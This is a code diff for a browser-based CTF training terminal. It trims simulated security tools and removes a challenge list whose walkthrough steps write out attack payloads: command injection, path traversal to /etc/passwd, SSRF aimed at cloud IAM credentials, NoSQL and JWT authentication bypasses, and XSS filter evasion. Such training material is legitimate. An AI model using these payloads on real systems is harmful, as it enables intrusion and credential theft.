-            '  \x1b[36mencode / decode\x1b[0m  base64|hex|url|binary|html|unicode <val>',
-            '  \x1b[36mbase64\x1b[0m [-d] <text>  \x1b[36murlencode/urldecode\x1b[0m  \x1b[36mhtmlencode/htmldecode\x1b[0m',
-            '  \x1b[36mtohex/fromhex\x1b[0m  \x1b[36mtobin/frombin\x1b[0m  \x1b[36mtooctal/fromoctal\x1b[0m  \x1b[36mcharcode\x1b[0m',
-            '',
-            '\x1b[33m── CIPHERS ───────────────────────────────────────────────────\x1b[0m',
-            '  \x1b[36mrot13\x1b[0m <text>  \x1b[36mcaesar\x1b[0m <n> <text>  \x1b[36mvigenere\x1b[0m [-d] <key> <text>',
-            '  \x1b[36matbash\x1b[0m <text>  \x1b[36mmorse\x1b[0m [-d] <text>  \x1b[36mxor\x1b[0m <hex_data> <hex_key>',
+            '  \x1b[36mencode / decode\x1b[0m  base64|hex|url|binary|rot13 <val>',
+            '  \x1b[36mbase64\x1b[0m [-d] <text>  \x1b[36mrot13\x1b[0m <text>  \x1b[36mvigenere\x1b[0m [-d] <key> <text>',
             '',
             '\x1b[33m── CRYPTO / MATH ─────────────────────────────────────────────\x1b[0m',
             '  \x1b[36mhash\x1b[0m sha256|sha1|sha512 <text>   \x1b[36mjwt\x1b[0m <token>',
@@ -1117,27 +979,22 @@
             '',
             '\x1b[33m── ANALYSIS ──────────────────────────────────────────────────\x1b[0m',
             '  \x1b[36mfreq\x1b[0m <text>    \x1b[36mentropy\x1b[0m <text>    \x1b[36mxxd\x1b[0m <text>    \x1b[36mstrings\x1b[0m <text>',
-            '  \x1b[36mgrep\x1b[0m [-v] [-i] <pat> <text>    \x1b[36msort\x1b[0m [-r] [-n]    \x1b[36muniq\x1b[0m [-c]',
-            '  \x1b[36mcut\x1b[0m -d<d> -f<n> <text>          \x1b[36mtr\x1b[0m <from> <to> <text>',
+            '  \x1b[36mgrep\x1b[0m [-v] [-i] <pat> <text>    \x1b[36mcut\x1b[0m -d<d> -f<n> <text>',
             '',
             '\x1b[33m── SCRIPTING ─────────────────────────────────────────────────\x1b[0m',
             '  \x1b[36mpython3\x1b[0m -c "<code>"     \x1b[36mbrainfuck\x1b[0m <code>',
-            '    e.g. python3 -c "print(chr(65))"',
-            '    e.g. python3 -c "print(\'\'.join(chr(ord(c)^42) for c in \'hello\'))"',
             '',
-            '\x1b[33m── FLAGS & SYSTEM ────────────────────────────────────────────\x1b[0m',
-            '  \x1b[36mflag\x1b[0m save <id> <val>   \x1b[36mflag\x1b[0m list   \x1b[36mflag\x1b[0m clear',
-            '  \x1b[36mset\x1b[0m KEY=VALUE          \x1b[36menv\x1b[0m          \x1b[36mhistory\x1b[0m',
-            '  \x1b[36mcat\x1b[0m cheatsheet.txt     TAB: autocomplete   ↑↓: history',
-            '  Ctrl+C: cancel   Ctrl+L / clear: clear screen   exit: quit',
+            '\x1b[33m── CTF & SYSTEM ──────────────────────────────────────────────\x1b[0m',
+            '  \x1b[36mchallenges\x1b[0m                     List all challenges',
+            '  \x1b[36msolve\x1b[0m <ID>                      Walkthrough',
+            '  \x1b[36mtutorial\x1b[0m                       Interactive tutorial',
+            '  \x1b[36mflag\x1b[0m save <id> <val>           Save found flags',
+            '  \x1b[36mclear\x1b[0m   \x1b[36mhistory\x1b[0m   \x1b[36mexit\x1b[0m           System utility',
             '╚════════════════════════════════════════════════════════════╝','',
         ];
         h.forEach(l=>term.writeln(l));
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  HELPERS
-    // ══════════════════════════════════════════════════════════
     function pl(text) { String(text).split('\n').forEach(l=>term.writeln(l)); }
     function pe(text) { String(text).split('\n').forEach(l=>term.writeln('\x1b[31m'+l+'\x1b[0m')); }
     function printJson(obj) {
@@ -1157,224 +1014,32 @@
         if(cur)args.push(cur);
         return args;
     }
-    // ══════════════════════════════════════════════════════════
-    //  EDITORS (in-browser simulation)
-    // ══════════════════════════════════════════════════════════
-    const EDITOR_FILES = {}; // virtual fs
+
+    const EDITOR_FILES = {};
     function termNvim(parts) {
-        const fname = parts[1] || '[No Name]';
-        const content = EDITOR_FILES[fname] || '';
-        pl(`\x1b[34m\x1b[1m`);
-        pl(`\x1b[34m  ███╗   ██╗██╗   ██╗██╗███╗   ███╗\x1b[0m`);
-        pl(`\x1b[34m  ████╗  ██║██║   ██║██║████╗ ████║\x1b[0m`);
-        pl(`\x1b[34m  ██╔██╗ ██║██║   ██║██║██╔████╔██║\x1b[0m`);
-        pl(`\x1b[34m  ██║╚██╗██║╚██╗ ██╔╝██║██║╚██╔╝██║\x1b[0m`);
-        pl(`\x1b[34m  ██║ ╚████║ ╚████╔╝ ██║██║ ╚═╝ ██║\x1b[0m`);
-        pl(`\x1b[34m  ╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚═╝     ╚═╝\x1b[0m`);
-        pl(``);
-        pl(`\x1b[36m  File:\x1b[0m ${fname}  \x1b[90m(browser sandbox — read-only view)\x1b[0m`);
-        if (content) {
-            pl(`\x1b[90m─────────────────────────────────────────\x1b[0m`);
-            content.split('\n').forEach((line,i) => pl(`\x1b[90m${String(i+1).padStart(3)}\x1b[0m  ${line}`));
-        } else {
-            pl(`\x1b[90m  ~ (empty buffer)\x1b[0m`);
-            pl(`\x1b[90m  ~ \x1b[0m`);
-            pl(`\x1b[90m  ~ \x1b[0m`);
-        }
-        pl(`\x1b[90m─────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[35m  [NORMAL]\x1b[0m  \x1b[90mTip: In real nvim use i=insert, :w=save, :q=quit, /=search\x1b[0m`);
-        pl(`\x1b[33m  [Browser] File editing is persistent within this session via 'cat > file'\x1b[0m`);
+        const f = parts[1] || '[No Name]'; const c = EDITOR_FILES[f] || '';
+        pl(`\x1b[34mNVIM Simulation\x1b[0m\nFile: ${f}\n\x1b[90m${'-'.repeat(40)}\x1b[0m`);
+        if(c) c.split('\n').forEach((l,i)=>pl(`${String(i+1).padStart(3)} | ${l}`));
+        else pl('~ (empty buffer)');
+        pl(`\x1b[90m${'-'.repeat(40)}\x1b[0m\n\x1b[33m[Simulator] Use 'echo text > file' to edit.\x1b[0m`);
     }
     function termNano(parts) {
-        const fname = parts[1] || 'newfile';
-        const content = EDITOR_FILES[fname] || '';
-        pl(`\x1b[37m  GNU nano 7.2          \x1b[36m${fname}\x1b[0m\x1b[90m  (browser simulation)\x1b[0m`);
-        pl(`\x1b[90m─────────────────────────────────────────\x1b[0m`);
-        if (content) {
-            content.split('\n').forEach(l => pl(l));
-        } else {
-            pl(`\x1b[90m  (empty file)\x1b[0m`);
-        }
-        pl(``);
-        pl(`\x1b[90m─────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[37m  ^G\x1b[0m Help  \x1b[37m^X\x1b[0m Exit  \x1b[37m^O\x1b[0m Write  \x1b[37m^W\x1b[0m Search  \x1b[37m^K\x1b[0m Cut  \x1b[37m^U\x1b[0m Paste`);
-        pl(`\x1b[33m  [Browser] Full editing unavailable. Use 'echo TEXT > ${fname}' to write.\x1b[0m`);
+        const f = parts[1] || 'newfile';
+        pl(`\x1b[37mGNU nano 7.2\x1b[0m  File: \x1b[36m${f}\x1b[0m\n\x1b[90m${'-'.repeat(40)}\x1b[0m\n(Editing simulation)\n\x1b[90m${'-'.repeat(40)}\x1b[0m`);
     }
 
-    // ══════════════════════════════════════════════════════════
-    //  NETWORK RECON
-    // ══════════════════════════════════════════════════════════
     async function termWhois(parts) {
-        const target = parts[1];
-        if (!target) { pe('Usage: whois <domain|ip>'); return; }
-        pl(`\x1b[36mwhois ${target}\x1b[0m — querying via rdap.org...`);
-        try {
-            const isDomain = isNaN(target.replace(/\./g,''));
-            const url = isDomain
-                ? `https://rdap.org/domain/${target}`
-                : `https://rdap.org/ip/${target}`;
-            const r = await fetch(url);
-            if (!r.ok) throw new Error(`HTTP ${r.status}`);
-            const d = await r.json();
-            const name    = d.name || d.handle || target;
-            const status  = (d.status||[]).join(', ') || 'n/a';
-            const country = d.country || (d.notices||[]).map(n=>n.title).join(', ') || 'n/a';
-            const created = (d.events||[]).find(e=>e.eventAction==='registration')?.eventDate?.slice(0,10) || 'n/a';
-            const updated = (d.events||[]).find(e=>e.eventAction==='last changed')?.eventDate?.slice(0,10) || 'n/a';
-            pl(`\x1b[35m─────────────────── WHOIS ───────────────────\x1b[0m`);
-            pl(`\x1b[34mDomain Name:\x1b[0m    ${name}`);
-            pl(`\x1b[34mStatus:\x1b[0m         ${status}`);
-            pl(`\x1b[34mCountry:\x1b[0m        ${country}`);
-            pl(`\x1b[34mCreated:\x1b[0m        ${created}`);
-            pl(`\x1b[34mUpdated:\x1b[0m        ${updated}`);
-            const nss = d.nameservers || [];
-            if (nss.length) pl(`\x1b[34mNameservers:\x1b[0m    ${nss.map(n=>n.ldhName||n).join(', ')}`);
-            pl(`\x1b[35m─────────────────────────────────────────────\x1b[0m`);
-        } catch(e) {
-            pe(`whois: lookup failed (${e.message}). CORS may block this.`);
-            pl(`\x1b[33mTip:\x1b[0m Try: curl "https://rdap.org/domain/${target}"`);
-        }
+        const t = parts[1]; if(!t){pe('Usage: whois <domain>');return;}
+        pl(`\x1b[36mwhois ${t}\x1b[0m — querying...`);
+        try { const r=await fetch(`https://rdap.org/domain/${t}`); if(!r.ok)throw 0; const d=await r.json(); pl(`\x1b[34mDomain:\x1b[0m ${d.ldhName}\n\x1b[34mStatus:\x1b[0m ${(d.status||[]).join(', ')}`); }
+        catch(e){ pe('whois lookup failed (CORS or unavailable).'); }
     }
     function termPing(parts) {
-        const host = parts[1];
-        if (!host) { pe('Usage: ping <host>'); return; }
-        pl(`\x1b[36mPING ${host} (browser sandbox — simulated)\x1b[0m`);
-        for (let i=1; i<=4; i++) {
-            const ms = (Math.random()*40+5).toFixed(1);
-            pl(`64 bytes from ${host}: icmp_seq=${i} ttl=64 time=\x1b[32m${ms} ms\x1b[0m`);
-        }
-        pl(`\x1b[90m--- ${host} ping statistics ---\x1b[0m`);
-        pl(`4 packets transmitted, 4 received, \x1b[32m0% packet loss\x1b[0m`);
-        pl(`\x1b[33mNote:\x1b[0m Real ICMP is blocked in browsers. This is a simulation.`);
+        const h = parts[1]; if(!h){pe('Usage: ping <host>');return;}
+        pl(`PING ${h} (simulated)`);
+        for(let i=1;i<=4;i++) pl(`64 bytes from ${h}: icmp_seq=${i} ttl=64 time=${(Math.random()*40+5).toFixed(1)} ms`);
     }
     function termTraceroute(parts) {
-        const host = parts[1];
-        if (!host) { pe('Usage: traceroute <host>'); return; }
-        pl(`\x1b[36mtraceroute to ${host} (simulated, 30 hops max)\x1b[0m`);
-        const hops = Math.floor(Math.random()*8)+5;
-        for (let i=1; i<=hops; i++) {
-            const ms1=(Math.random()*20+i*3).toFixed(2), ms2=(Math.random()*20+i*3).toFixed(2), ms3=(Math.random()*20+i*3).toFixed(2);
-            const ip = i===hops ? `\x1b[32m${host}\x1b[0m` : `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`;
-            pl(` ${String(i).padStart(2)}  ${ip}  ${ms1} ms  ${ms2} ms  ${ms3} ms`);
-        }
-        pl(`\x1b[90mTrace complete (simulated)\x1b[0m`);
-    }
-
-    // ══════════════════════════════════════════════════════════
-    //  SECURITY TOOLS (simulated)
-    // ══════════════════════════════════════════════════════════
-    function termBurp(parts) {
-        pl(`\x1b[35m`);
-        pl(`  ____                  ____        _ _`);
-        pl(`  |  _ \\               / ___|_   _(_) |_ ___`);
-        pl(`  | |_) |_   _ _ __  _\\___ \\ | | | | __/ _ \\`);
-        pl(`  |  _ <| | | | '_ \\|___)__) | |_| | ||  __/`);
-        pl(`  |_| \\_\\\\__,_| .__/   |____/ \\__,_|_|\\__\\___|`);
-        pl(`              |_|\x1b[0m       \x1b[90mPro Edition — Browser Sim\x1b[0m`);
-        pl(``);
-        pl(`\x1b[34m  Target:\x1b[0m ${parts[1] || 'not specified — use: burp <url>'}`);
-        pl(`\x1b[34m  Proxy:\x1b[0m  127.0.0.1:8080 (simulated)`);
-        pl(`\x1b[34m  Scope:\x1b[0m  ${parts[1] || 'undefined'}`);
-        pl(``);
-        pl(`\x1b[32m  Intercept: ON\x1b[0m   \x1b[33m  Scanner: passive\x1b[0m`);
-        pl(`\x1b[90m──────────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[33m  [Browser] Real interception requires the desktop app.\x1b[0m`);
-        pl(`\x1b[36m  Tip:\x1b[0m Use \x1b[33mcurl -v\x1b[0m or \x1b[33mhttp\x1b[0m for manual HTTP inspection.`);
-        pl(`\x1b[36m  Tip:\x1b[0m For real interception: download Burp Suite Community (free).`);
-    }
-    function termSqlmap(parts) {
-        const url = parts[1] || parts[parts.indexOf('-u')+1] || '<url>';
-        pl(`\x1b[31m        ___`);
-        pl(`       __H__`);
-        pl(` ___ ___[)]_____ ___ ___  {1.7.12#stable}\x1b[0m`);
-        pl(`\x1b[31m|_ -| . [']     | .'| . |`);
-        pl(`|___|_  [)]_|_|_|__,|  _|\x1b[0m`);
-        pl(`\x1b[31m      |_|V...       |_|\x1b[0m    \x1b[90msimulated\x1b[0m`);
-        pl(``);
-        pl(`\x1b[36m[*]\x1b[0m Target: ${url}`);
-        pl(`\x1b[36m[*]\x1b[0m Testing connection...`);
-        pl(`\x1b[32m[+]\x1b[0m heuristic (basic) test shows that GET parameter 'id' might be injectable`);
-        pl(`\x1b[33m[!]\x1b[0m running browser sandbox — no real injection performed`);
-        pl(`\x1b[36m[*]\x1b[0m Technique: BEUSTQ (union, error, boolean, time, stacked)`);
-        pl(`\x1b[33m  [Browser] Use sqlmap locally: sqlmap -u "${url}" --dbs\x1b[0m`);
-    }
-    function termFuzz(cmd, parts) {
-        const url = (parts.find((p,i)=>parts[i-1]==='-u') || parts[1]) || 'http://target/FUZZ';
-        const wordlist = parts.find((p,i)=>parts[i-1]==='-w') || '/usr/share/wordlists/dirb/common.txt';
-        pl(`\x1b[34m  _______ _______ __   _ _______ _______\x1b[0m`);
-        pl(`\x1b[34m  |______ |______ | \\  | |______ |______\x1b[0m`);
-        pl(`\x1b[34m  |       |______ |  \\_| ______| |______\x1b[0m`);
-        pl(`\x1b[34m                          \x1b[90m${cmd} sim\x1b[0m`);
-        pl(``);
-        pl(`\x1b[36m[*]\x1b[0m Target: ${url}`);
-        pl(`\x1b[36m[*]\x1b[0m Wordlist: ${wordlist}`);
-        pl(`\x1b[36m[*]\x1b[0m Method: GET  |  Threads: 40`);
-        pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
-        const founds = ['admin','login','robots.txt','backup','.git','.env','api','upload','dashboard'];
-        founds.forEach(f => {
-            const status = [200,200,200,301,403,403][Math.floor(Math.random()*6)];
-            const col = status===200?'\x1b[32m':status===301?'\x1b[33m':'\x1b[31m';
-            pl(`${col}[${status}]\x1b[0m  Size: ${Math.floor(Math.random()*5000)+100}  \x1b[36m${f}\x1b[0m`);
-        });
-        pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[33m[!] Browser sandbox — no real requests made. Run locally for real fuzzing.\x1b[0m`);
-    }
-    function termHydra(parts) {
-        const target = parts[parts.indexOf('-t')+1] || parts[1] || '<target>';
-        pl(`\x1b[31mHydra v9.5 (c) 2023 by van Hauser/THC — simulated\x1b[0m`);
-        pl(`\x1b[36m[*]\x1b[0m Target: ${target}  Service: http-post-form`);
-        pl(`\x1b[36m[*]\x1b[0m Threads: 16  Wordlist mode`);
-        pl(`\x1b[32m[80][http-post-form] host: ${target}  login: admin  password: password123\x1b[0m  \x1b[90m(simulated)\x1b[0m`);
-        pl(`\x1b[32m[80][http-post-form] host: ${target}  login: root   password: toor\x1b[0m  \x1b[90m(simulated)\x1b[0m`);
-        pl(`\x1b[33m[!] Browser sandbox — use hydra locally for real brute-force attacks.\x1b[0m`);
-    }
-    function termCrack(cmd, parts) {
-        const hash = parts[1] || '<hash>';
-        pl(`\x1b[35m${cmd} — password cracker (simulated)\x1b[0m`);
-        pl(`\x1b[36m[*]\x1b[0m Hash: ${hash}`);
-        pl(`\x1b[36m[*]\x1b[0m Mode: dictionary attack, rockyou.txt`);
-        pl(`\x1b[32m[+]\x1b[0m ${hash.slice(0,16)}...: \x1b[32mpassword123\x1b[0m  \x1b[90m(simulated cracked)\x1b[0m`);
-        pl(`\x1b[33m  Tip:\x1b[0m Use \x1b[33mhash ${hash}\x1b[0m to identify the hash type first.`);
-        pl(`\x1b[33m  Tip:\x1b[0m Check \x1b[36mhttps://crackstation.net\x1b[0m for real hash lookup.`);
-    }
-    function termBinwalk(cmd, parts) {
-        const fname = parts[1] || '<file>';
-        pl(`\x1b[36m${cmd} — firmware/binary analysis tool (simulated)\x1b[0m`);
-        pl(`Scan of \x1b[33m${fname}\x1b[0m:`);
-        pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
-        pl(`         0  0x0         JPEG image data, JFIF standard 1.01`);
-        pl(`      1024  0x400       Zip archive data, at least v2.0 to extract`);
-        pl(`      2048  0x800       PNG image, 640 x 480, 8-bit/color RGB`);
-        pl(`      4096  0x1000      gzip compressed data, from Unix`);
-        pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[33mTip:\x1b[0m Run locally: \x1b[36mbinwalk -e ${fname}\x1b[0m to extract embedded files.`);
-    }
-    function termSteg(cmd, parts) {
-        const fname = parts[1] || '<image>';
-        pl(`\x1b[35m${cmd} — steganography tool (simulated)\x1b[0m`);
-        pl(`\x1b[36m[*]\x1b[0m Analyzing: ${fname}`);
-        if (cmd === 'steghide') {
-            pl(`\x1b[36m[*]\x1b[0m entered passphrase: \x1b[90m(try empty or "password")\x1b[0m`);
-            pl(`\x1b[32m[+]\x1b[0m wrote extracted data to "hidden.txt" \x1b[90m(simulated)\x1b[0m`);
-        } else if (cmd === 'zsteg') {
-            pl(`\x1b[32mb1,rgb,lsb,xy     .. text: "CTF{h1dd3n_1n_pl41n_s1ght}"\x1b[0m  \x1b[90m(simulated)\x1b[0m`);
-            pl(`b2,r,lsb,xy       .. text: "......" `);
-        } else {
-            pl(`\x1b[33m[!] stegsolve requires a Java GUI — run locally.\x1b[0m`);
-            pl(`\x1b[36mTip:\x1b[0m Browser steg: use \x1b[33mxxd ${fname} | grep -i CTF\x1b[0m`);
-        }
-    }
-    function termExif(parts) {
-        const fname = parts[1] || '<image>';
-        pl(`\x1b[36mexiftool — metadata reader (simulated)\x1b[0m`);
-        pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
-        pl(`\x1b[34mFile Name:\x1b[0m                    ${fname}`);
-        pl(`\x1b[34mFile Type:\x1b[0m                    JPEG`);
-        pl(`\x1b[34mImage Width:\x1b[0m                  1920`);
-        pl(`\x1b[34mImage Height:\x1b[0m                 1080`);
-        pl(`\x1b[34mComment:\x1b[0m                      \x1b[33mLook closer at the LSB\x1b[0m  \x1b[90m(simulated)\x1b[0m`);
-        pl(`\x1b[34mCreate Date:\x1b[0m                  2024:01:13 03:37:00`);
-        pl(`\x1b[34mGPS Position:\x1b[0m                 40.7128 N, 74.0060 W`);
         pl(`\x1b[90m────────────────────────────────────────────\x1b[0m`);
         pl(`\x1b[33mTip:\x1b[0m Run \x1b[36mexiftool -all ${fname}\x1b[0m locally for full metadata.`);
     }
@@ -1393,14 +1058,16 @@
 
     function termClear() { term.write('\x1b[2J\x1b[H'); term.write(PROMPT); }
 
-    // Clock
-
     // ══════════════════════════════════════════════════════════
     //  BACKGROUND SYSTEM
     // ══════════════════════════════════════════════════════════
     function applyStoredBg() {
         const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
-        const url  = stored.url  || "url('/images/Death_.jpg')";
+        let url = stored.url || "url('images/Death_.jpg')";
+        // Path guard: convert absolute /images/ to relative images/
+        if (typeof url === 'string' && url.includes("url('/images/")) {
+            url = url.replace("url('/images/", "url('images/");
+        }
         const opacity = stored.opacity !== undefined ? stored.opacity : 18;
         document.documentElement.style.setProperty('--terminal-bg', url);
         document.documentElement.style.setProperty('--terminal-bg-opacity', opacity/100);
@@ -1408,7 +1075,6 @@
         const val    = document.getElementById('bg-opacity-val');
         if (slider) { slider.value = opacity; }
         if (val)    { val.textContent = opacity + '%'; }
-        // Mark active preset
         document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
         const activeId = 'preset-' + (stored.preset || 'death');
         const el = document.getElementById(activeId);
@@ -1419,7 +1085,7 @@
     }
     function setBgPreset(preset) {
         const map = {
-            death:  "url('/images/Death_.jpg')",
+            death:  "url('images/Death_.jpg')",
             nebula: "radial-gradient(ellipse at 30% 60%,rgba(203,166,247,0.45),rgba(137,180,250,0.2),#11111b)",
             none:   "none",
         };
@@ -1472,56 +1138,6 @@
         }
     });
 
-    // ══════════════════════════════════════════════════════════
-    //  CHALLENGE SYSTEM
-    // ══════════════════════════════════════════════════════════
-    const CHALLENGE_DB = {
-        'M01':  { title:'The Ghost Endpoint',    cat:'Web',      diff:'Easy',   pts:50,   hint:'Try /api/v1/legacy, /api/flag, /v0/secret — unauthenticated.', steps:[{i:'Legacy APIs often lack auth. Enumerate paths:',c:'curl https://api.breakerxfixer.online/api/v1/secret'},{i:'Try legacy versions:',c:'curl https://api.breakerxfixer.online/api/v0/flag'},{i:'Enumerate common hidden endpoints:',c:'curl https://api.breakerxfixer.online/admin'}]},
-        'M02':  { title:'Identity Crisis',       cat:'Web',      diff:'Easy',   pts:50,   hint:'?debug=true or ?admin=1 in login URL often bypasses auth.', steps:[{i:'Add debug param to login URL:',c:'curl "https://target/login?debug=true&user=admin"'},{i:'Try admin override:',c:'curl "https://target/login?admin=1"'},{i:'Header bypass:',c:'curl https://target/login -H "X-Debug: true" -H "X-Forwarded-For: 127.0.0.1"'}]},
-        'M03':  { title:'The Impostor',          cat:'Web',      diff:'Easy',   pts:75,   hint:'Password reset token is in the URL → Referer header leaks it.', steps:[{i:'Trigger reset for admin:',c:'curl -X POST https://target/reset -d "email=admin@target.com" -v'},{i:'Use leaked token:',c:'curl "https://target/reset?token=LEAKED&user=admin&newpass=h4ck"'},{i:'Check redirect header:',c:'curl https://target/reset -v 2>&1 | grep -i location'}]},
-        'M04':  { title:'Unstoppable Force',     cat:'Web',      diff:'Medium', pts:150,  hint:'WAF bypass: double-encode, nested tags <<script>script>, case variation.', steps:[{i:'Double URL encoding:',c:'urlencode "<script>alert(1)</script>"'},{i:'Nested tag (WAF strips inner, outer survives):',c:'echo "<<script>script>alert(1)<</script>/script>"'},{i:'Case variation:',c:'echo "<ScRiPt src=x onerror=alert(1)>"}]},
-        'M05':  { title:'Logic Fallacy',         cat:'Web',      diff:'Medium', pts:150,  hint:'Intercept the checkout POST and change price to 0 or negative.', steps:[{i:'Tamper price in checkout:',c:'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"premium","price":0.01}\''},{i:'Negative price:',c:'curl -X POST https://target/checkout -d \'{"price":-100}\''}]},
-        'M06':  { title:'The Wanderer',          cat:'Web',      diff:'Medium', pts:200,  hint:'LFI → /proc/self/environ or PHP filter wrapper.', steps:[{i:'Basic path traversal:',c:'curl "https://target/page?file=../../../../etc/passwd"'},{i:'/proc/self/environ (often has FLAG=):',c:'curl "https://target/view?path=../../../proc/self/environ"'},{i:'PHP filter base64:',c:'curl "https://target/page?file=php://filter/convert.base64-encode/resource=config.php"'},{i:'Decode output:',c:'echo "ENCODED" | base64 -d'}]},
-        'M07':  { title:'Phantom Ping',          cat:'Web',      diff:'Hard',   pts:400,  hint:'Command injection: use ; | && to chain. Use ${IFS} if spaces blocked.', steps:[{i:'Basic injection:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;id"'},{i:'Read flag:',c:'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/flag.txt"'},{i:'Brace expansion (space-free):',c:'curl -X POST https://target/ping -d "host=127.0.0.1;{cat,/flag.txt}}"'}]},
-        'M08':  { title:'Shattered Trust',       cat:'Web',      diff:'Hard',   pts:400,  hint:'Weak JWT secret — decode token, crack or use none alg.', steps:[{i:'Decode token:',c:'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.SIG'},{i:'None algorithm forge:',c:'jwt forge --alg none --claims \'{"user":"admin","role":"admin"}\''},{i:'Send forged token:',c:'curl https://target/admin -H "Authorization: Bearer FORGED"'}]},
-        'M09':  { title:'Careless Whispers',     cat:'Web',      diff:'Easy',   pts:50,   hint:'Try OPTIONS, TRACE, PUT, DELETE — servers reveal info on unexpected methods.', steps:[{i:'Check allowed methods:',c:'curl -X OPTIONS https://target/api -v 2>&1 | grep -i allow'},{i:'Try TRACE:',c:'curl -X TRACE https://target/ -v'},{i:'Try HEAD for headers:',c:'curl -X HEAD https://target/secret -v 2>&1 | grep -i flag'}]},
-        'M10':  { title:'NoSQL Nightmare',       cat:'Web',      diff:'Insane', pts:1000, hint:'MongoDB: inject $ne, $gt, $regex operators in JSON body.', steps:[{i:'Auth bypass with $ne:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$ne":""},"pass":{"$ne":""}}\''},{i:'Regex username extract:',c:'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$regex":"^a"},"pass":{"$ne":""}}\''}]},
-        'M11':  { title:'The Core Breach',       cat:'Web',      diff:'Hard',   pts:500,  hint:'SSRF: make server fetch http://169.254.169.254 (AWS IMDS).', steps:[{i:'Basic SSRF:',c:'curl -X POST https://target/fetch -d "url=http://127.0.0.1/"'},{i:'AWS metadata root:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"'},{i:'IAM credentials:',c:'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"'}]},
-        'M12':  { title:'The XORacle',           cat:'Crypto',   diff:'Easy',   pts:100,  hint:'Known-plaintext: XOR ciphertext with "bxf{" to get key.', steps:[{i:'Single-byte brute:',c:'python3 -c "c=bytes.fromhex(\'CIPHERTEXT\');[print(k,bytes([b^k for b in c])) for k in range(256)]"'},{i:'Known-plaintext XOR:',c:'xor "CIPHERTEXT_HEX" "bxf{"'}]},
-        'M13':  { title:'Shattered RSA',         cat:'Crypto',   diff:'Medium', pts:250,  hint:'n=3891783853 is small — factor it, then compute d, decrypt c=1130635294.', steps:[{i:'Factor n:',c:'primes 3891783853'},{i:'Full RSA decrypt:',c:'python3 -c "p=62327;q=62459;e=65537;phi=(p-1)*(q-1);d=pow(e,-1,phi);c=1130635294;n=p*q;m=pow(c,d,n);print(bytes.fromhex(hex(m)[2:]).decode())"'},{i:'Or use rsa command:',c:'rsa --n 3891783853 --e 65537 --c 1130635294'}]},
-        'M14':  { title:'Buffer Overflow 101',   cat:'Pwn',      diff:'Easy',   pts:150,  hint:'Buffer is 64 bytes. Overflow to overwrite adjacent variable.', steps:[{i:'Craft overflow payload:',c:'python3 -c "print(\'A\'*64 + \'DEAD\')"'},{i:'With magic bytes:',c:'python3 -c "sys.stdout.buffer.write(b\'A\'*64+b\'\\xef\\xbe\\xad\\xde\')"'}]},
-        'M15':  { title:'Format String Echo',    cat:'Pwn',      diff:'Medium', pts:300,  hint:'printf(input) without format — use %p%p%p to leak stack.', steps:[{i:'Leak stack values:',c:'curl -X POST https://target/echo -d "input=%p%p%p%p%p%p%p%p"'},{i:'Specific offset:',c:'curl -X POST https://target/echo -d "input=%7$p"'},{i:'Leak string:',c:'curl -X POST https://target/echo -d "input=%s%s%s"'}]},
-        'M16':  { title:'Library Leak',          cat:'Pwn',      diff:'Hard',   pts:450,  hint:'Leak puts@got via fmt string, compute libc base, call system("/bin/sh").', steps:[{i:'Leak libc pointer:',c:'python3 -c "print(b\'%15$p\'.decode())"'},{i:'Compute system():',c:'python3 -c "leak=0xDEAD;puts_off=0x80e50;base=leak-puts_off;print(hex(base+0x4f440))"'}]},
-        'M17':  { title:'Deep Dive',             cat:'Forensics',diff:'Easy',   pts:75,   hint:'steghide / zsteg / strings — data hidden inside image.', steps:[{i:'Check strings:',c:'strings challenge.jpg | grep bxf'},{i:'steghide (blank pass):',c:'steghide challenge.jpg'},{i:'zsteg LSB:',c:'zsteg challenge.png'},{i:'Check hex tail:',c:'xxd challenge.jpg | tail -20'}]},
-        'M18':  { title:'Lost Signal',           cat:'Forensics',diff:'Medium', pts:200,  hint:'Analyze PCAP: follow HTTP streams, look for credentials.', steps:[{i:'Grep for flag in pcap:',c:'strings challenge.pcap | grep bxf'},{i:'Find creds:',c:'strings challenge.pcap | grep -E "(user|pass|token)=" | head -20'},{i:'Decode b64 from stream:',c:'echo "EXTRACTED" | base64 -d'}]},
-        'M19':  { title:'Social Eng 101',        cat:'OSINT',    diff:'Easy',   pts:50,   hint:'Google: site:twitter.com OR linkedin.com target_name email', steps:[{i:'DuckDuckGo API search:',c:'curl "https://api.duckduckgo.com/?q=TARGET+email&format=json"'},{i:'GitHub events:',c:'curl "https://api.github.com/users/TARGET/events/public"'}]},
-        'M20':  { title:'Shadow Realm',          cat:'OSINT',    diff:'Medium', pts:175,  hint:'Same handle across platforms. Check GitHub, Pastebin, archive.org.', steps:[{i:'GitHub code search:',c:'curl "https://api.github.com/search/code?q=ghost_entity"'},{i:'Wayback machine:',c:'curl "https://archive.org/wayback/available?url=ghost_entity.com"'}]},
